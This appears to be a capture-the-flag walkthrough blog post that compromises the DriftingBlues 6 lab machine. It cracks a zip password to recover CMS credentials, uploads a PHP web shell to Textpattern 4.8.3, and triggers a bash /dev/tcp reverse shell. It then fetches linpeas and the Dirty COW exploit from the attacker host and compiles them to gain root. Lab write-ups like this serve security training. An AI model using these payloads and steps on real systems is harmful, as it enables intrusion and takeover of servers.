---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/driftingblues-6,672/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Starting with a simple `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.76.219
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 10:01 EST
Nmap scan report for 192.168.76.219
Host is up (0.028s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.76.219/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.76.219/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/11/19 10:02:37 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 200) [Size: 53656]
/index                (Status: 200) [Size: 750]  
/index.html           (Status: 200) [Size: 750]  
/index.html           (Status: 200) [Size: 750]  
/robots               (Status: 200) [Size: 110]  
/robots.txt           (Status: 200) [Size: 110]  
/robots.txt           (Status: 200) [Size: 110]  
/textpattern          (Status: 301) [Size: 322] [--> http://192.168.76.219/textpattern/]
                                                                                        
===============================================================
2022/11/19 10:04:19 Finished
===============================================================
```

## resource `robots.txt`
### request
```http
GET /robots.txt HTTP/1.1
Host: 192.168.76.219
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Sat, 19 Nov 2022 15:03:56 GMT
Server: Apache/2.2.22 (Debian)
Last-Modified: Mon, 15 Mar 2021 19:51:18 GMT
ETag: "3738-6e-5bd9892bb9980"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 110
Connection: close
Content-Type: text/plain

User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

There is a hint we should add the extension `zip` to our dir busting.

## dir busting again
```bash
$ gobuster dir -u http://192.168.76.219/ -w directory-list-2.3-medium.txt -t 5 -x zip -b 404,403 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.76.219/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              zip
[+] Timeout:                 10s
===============================================================
2022/11/19 10:22:48 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]  
/spammer              (Status: 200) [Size: 179]  
/spammer.zip          (Status: 200) [Size: 179]  
Progress: 26560 / 441122 (6.02%)                ^C
[!] Keyboard interrupt detected, terminating.
                                                 
===============================================================
2022/11/19 10:25:24 Finished
===============================================================
```

> There is a file named `spammer.zip`
{: .prompt-info }

## resource `/textpattern`
`Textpattern` is a CMS which is available at [github](https://github.com/textpattern/textpattern).  
There is a file named `README.txt` which should reveal the version number of the software if it is available at the target.

### request
```http
GET /textpattern/README.txt HTTP/1.1
Host: 192.168.76.219
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Sat, 19 Nov 2022 15:20:23 GMT
Server: Apache/2.2.22 (Debian)
Last-Modified: Sun, 13 Sep 2020 19:56:06 GMT
ETag: "62e0-18a7-5af374ef08180"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 6311
Connection: close
Content-Type: text/plain

Textpattern CMS 4.8.3

Released under the GNU General Public License.
See LICENSE.txt for terms and conditions.
...
```

> `Textpattern CMS 4.8.3` is installed.
{: .prompt-info }

---

# exploitation
## looking for exploits
```bash
$ searchsploit textpattern cms 4.8.3
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
TextPattern CMS 4.8.3 - Remote Code Execution (Authenticated)                                                                                                                                             | php/webapps/48943.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is an authenticated RCE available, but therefore we first need credentials for the CMS.

## analyzing the file `spammer.zip`
```bash
$ unzip spammer.zip             
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
```
> Trying to `unzip` the file reveals that it is password protected.
{: .prompt-danger }

Lets create a hash file, so we can try to brute force the `zip` file with `john`.
```bash
$ zip2john spammer.zip                                                                                                                                                                                                               80 ⨯
ver 2.0 spammer.zip/creds.txt PKZIP Encr: cmplen=27, decmplen=15, crc=B003611D ts=ADCB cs=b003 type=0
spammer.zip/creds.txt:$pkzip$1*1*2*0*1b*f*b003611d*0*27*0*1b*b003*2d41804a5ea9a60b1769d045bfb94c71382b2e5febf63bda08a56c*$/pkzip$:creds.txt:spammer.zip::spammer.zip
```

After saving the hash to a file named `ziphash.txt` we can crack the `zip` file using `john`.

```bash
$ john ziphash.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE 2/3 (2022-11-19 10:25) 20.00g/s 1762Kp/s 1762Kc/s 1762KC/s gatito5..ship4
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> The `zip` password is `myspace4`.
{: .prompt-info }

Lets `unzip` the file now
```bash
$ unzip spammer.zip 
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
 extracting: creds.txt               

$ cat creds.txt    
mayer:lionheart 
```

> We got credentials! (`mayer:lionheart`)
{: .prompt-info }

## test login
Login page  
![login page](/images/driftingblues_adminlogin.png)

### request
```http
POST /textpattern/textpattern/index.php HTTP/1.1
Host: 192.168.76.219
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.76.219
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.76.219/textpattern/textpattern/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

lang=en&p_userid=mayer&p_password=lionheart&_txp_token=
```

### response
```http
HTTP/1.1 200 OK
Date: Sat, 19 Nov 2022 15:36:47 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.5.38-1~dotdeb+7.1
Set-Cookie: txp_login=mayer%2C47a600c191f0c7e05dcf997ce6aea1c3; httponly
Set-Cookie: txp_login_public=f00ffa8296mayer; path=/textpattern/
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Length: 28824
Connection: close
Content-Type: text/html; charset=utf-8


<script>
...
```

> It works!
{: .prompt-info }

## authenticated RCE
```bash
$ python3 /usr/share/exploitdb/exploits/php/webapps/48943.py  

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] USAGE: python3 exploit.py http://target.com username password
[*] EXAMPLE: python3 exploit.py http://localhost admin admin

$ python3 /usr/share/exploitdb/exploits/php/webapps/48943.py http://192.168.76.219/textpattern/ mayer lionheart

Software: TextPattern <= 4.8.3
CVE: CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload
Author: Michele '0blio_' Cisternino

[*] Authenticating to the target as 'mayer'
[✓] Logged in as 'mayer' (Cookie: txp_login=mayer%2C4bf37dae3d9c499b6efbd883beb25d8c; txp_login_public=e9d4041c57mayer)
[*] Grabbing _txp_token (required to proceed with exploitation)..
Traceback (most recent call last):
  File "/usr/share/exploitdb/exploits/php/webapps/48943.py", line 89, in <module>
    scriptJS = soup.find_all("script")[2].string.replace("var textpattern = ", "")[:-2]
AttributeError: 'NoneType' object has no attribute 'replace'
```

> The exploit seems to be broken.
{: .prompt-danger }

Lets analyze the exploit to see how we can exploit it manually.
```python
#!/usr/bin/python3

# Exploit Title: TextPattern <= 4.8.3 - Authenticated Remote Code Execution via Unrestricted File Upload
# Google Dork: N/A
# Date: 16/10/2020
# Exploit Author: Michele '0blio_' Cisternino
# Vendor Homepage: https://textpattern.com/
# Software Link: https://github.com/textpattern/textpattern
# Version: <= 4.8.3
# Tested on: Kali Linux x64
# CVE: N/A

import sys
import json
import requests
from bs4 import BeautifulSoup as bs4
from time import sleep
import random
import string
import readline

...

# Uploading the webshell
log.warning ("Sending payload..")

try:
    r = s.post (target + "textpattern/index.php?event=file", verify=False, headers=headers, files=multipart_form_data)
    if "Files uploaded" in r.text:
        log.success ("Webshell uploaded successfully as {}".format(randomFilename))
except:
    log.error ("Unexpected error..")
    sys.exit()

sleep(2)

...
```

The key point seems to be to upload a `php` file to gain code execution. So lets login and perform an upload manually.  
Calling the url mentioned in the `python` script (`textpattern/index.php?event=file`) shows an upload form.  

![file upload](/images/driftingblues_fileupload.png)

We create a simple web shell named `shell.php` with the following content.
```php
<?php system($_REQUEST['cmd']) ?>
```

After we uploaded this file the website looks like the following.

![file uploaded](/images/driftingblues_fileuploaded.png)  

Lets have a look if we can access the file

![shell](/images/driftingblues_shell.png)  

> The file is there. Now lets try a code execution
{: .prompt-info }
### request
```http
GET /textpattern/files/shell.php?cmd=id HTTP/1.1
Host: 192.168.76.219
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: txp_login_public=e903ded730mayer
Connection: close
```

### response
```http
HTTP/1.1 200 OK
Date: Sat, 19 Nov 2022 16:04:39 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.5.38-1~dotdeb+7.1
Vary: Accept-Encoding
Content-Length: 54
Connection: close
Content-Type: text/html

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> It works! We got a shell.
{: .prompt-info }

---

# post exploitation
## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80
listening on [any] 80 ...
```

### trigger reverse shell
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.76/80 0>&1'`
```http
GET /textpattern/files/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.76/80+0>%261' HTTP/1.1
Host: 192.168.76.219
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: txp_login_public=e903ded730mayer
Connection: close
```

### catch connection from target
```bash
$ nc -lvp 80
listening on [any] 80 ...
192.168.76.219: inverse host lookup failed: Unknown host
connect to [192.168.49.76] from (UNKNOWN) [192.168.76.219] 39977
bash: no job control in this shell
www-data@driftingblues:/var/www/textpattern/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> And we got a reverse shell.
{: .prompt-info }

## privilege escalation
### Using `linpeas.sh`
Providing `linpeas.sh` on attacker machine with a simple web server.
```bash
$ python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Execute a `wget` on the target to download `linpeas.sh` from the attacker machine.
```bash
www-data@driftingblues:/$ cd /tmp
cd /tmp
www-data@driftingblues:/tmp$ wget http://192.168.49.76/linpeas.sh
wget http://192.168.49.76/linpeas.sh
--2022-11-19 10:12:28--  http://192.168.49.76/linpeas.sh
Connecting to 192.168.49.76:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 764159 (746K) [text/x-sh]
Saving to: `linpeas.sh'

     0K .......... .......... .......... .......... ..........  6%  850K 1s
    50K .......... .......... .......... .......... .......... 13% 1.65M 1s
   100K .......... .......... .......... .......... .......... 20% 2.14M 0s
   150K .......... .......... .......... .......... .......... 26% 7.43M 0s
   200K .......... .......... .......... .......... .......... 33% 2.72M 0s
   250K .......... .......... .......... .......... .......... 40% 7.89M 0s
   300K .......... .......... .......... .......... .......... 46% 3.18M 0s
   350K .......... .......... .......... .......... .......... 53% 4.19M 0s
   400K .......... .......... .......... .......... .......... 60% 10.3M 0s
   450K .......... .......... .......... .......... .......... 67% 13.4M 0s
   500K .......... .......... .......... .......... .......... 73% 5.00M 0s
   550K .......... .......... .......... .......... .......... 80% 4.11M 0s
   600K .......... .......... .......... .......... .......... 87% 8.77M 0s
   650K .......... .......... .......... .......... .......... 93% 18.1M 0s
   700K .......... .......... .......... .......... ......    100% 3.55M=0.2s

2022-11-19 10:12:28 (3.31 MB/s) - `linpeas.sh' saved [764159/764159]
```

`linpeas.sh` gets downloaded.
```bash
$ python3 -m http.server 80                                                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.76.219 - - [19/Nov/2022 11:12:28] "GET /linpeas.sh HTTP/1.1" 200 -
```

Executing `linpeas.sh`
```bash
www-data@driftingblues:/tmp$ ls
ls
linpeas.sh
vmware-root
www-data@driftingblues:/tmp$ sh linpeas.sh
sh linpeas.sh
...
```

The `linpeas.sh` script shows the following exploit suggestions
```bash
...
╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
  [1] dirty_cow                                                                                                                                                                                                                             
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
...
```

Lets try [`dirty cow`](http://www.exploit-db.com/exploits/40616)  
  
After downloading the source file we provide it on our attacker machine, so we can download it from the target.
```bash
 python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we are performing a `wget` to download the file `40616.c` to the target
```bash
www-data@driftingblues:/tmp$ wget http://192.168.49.76/40616.c
wget http://192.168.49.76/40616.c
--2022-11-19 10:17:01--  http://192.168.49.76/40616.c
Connecting to 192.168.49.76:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4963 (4.8K) [text/x-csrc]
Saving to: `40616.c'

     0K ....                                                  100% 7.20M=0.001s

2022-11-19 10:17:01 (7.20 MB/s) - `40616.c' saved [4963/4963]
```

`40616.c` gets downloaded
```bash
 python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.76.219 - - [19/Nov/2022 11:17:01] "GET /40616.c HTTP/1.1" 200 -
```

Lets compile the source to a binary.
```bash
www-data@driftingblues:/tmp$ ls
ls
40616.c
linpeas.sh
vmware-root

www-data@driftingblues:/tmp$ gcc 40616.c -o cowroot -pthread  
gcc 40616.c -o cowroot -pthread
40616.c: In function 'procselfmemThread':
40616.c:99:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
In file included from 40616.c:28:0:
/usr/include/unistd.h:331:16: note: expected '__off_t' but argument is of type 'void *'
```

Execute the compiled binary to get `root`
```bash
www-data@driftingblues:/tmp$ ls
ls
40616.c
cowroot
linpeas.sh
vmware-root

www-data@driftingblues:/tmp$ ./cowroot   
./cowroot
whoami
root
```

> We got `root`!
{: .prompt-info }

## get the flag
```bash
cd /root
ls
proof.txt
cat proof.txt
1******************************9
```

Pwned! <@:-)
